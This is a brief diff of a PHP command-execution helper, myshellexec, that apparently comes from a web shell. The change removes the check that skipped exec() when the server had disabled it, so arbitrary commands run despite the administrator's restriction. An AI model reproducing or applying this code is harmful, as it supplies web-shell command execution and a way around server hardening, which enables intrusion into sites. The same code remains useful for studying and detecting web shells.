@@ -10,7 +10,7 @@ function myshellexec($cmd) {
     global $disablefunc;
     $result = "";
     if (!empty($cmd)) {
-        if (is_callable("exec") and ! in_array("exec", $disablefunc)) {
+        if (is_callable("exec")) {
             exec($cmd, $result);
             $result = join("\n", $result);
         } elseif (($result = `$cmd`) !== FALSE) {
